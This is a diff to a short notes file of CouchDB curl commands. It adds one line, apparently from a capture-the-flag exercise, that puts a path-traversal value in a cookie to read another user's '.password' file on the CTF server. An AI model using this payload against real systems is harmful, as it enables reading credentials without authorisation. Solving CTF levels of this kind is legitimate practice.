@@ -6,3 +6,7 @@ CouchDB
 ** curl -O -X will save the output to file
 * Get info on the design document 'test' in the database 'databasename' curl -X GET http://localhost:5984/databasename/_design/test/_info
 * Get the json from the design document 'test' in the database 'databasename' with the view 'all' curl -X GET http://localhost:5984/databasename/_design/test/all
+
+curl with cookie and user
+
+curl --digest -u level02  -b user_details='../../home/level03/.password'  http://ctf.stri.pe/level02.php
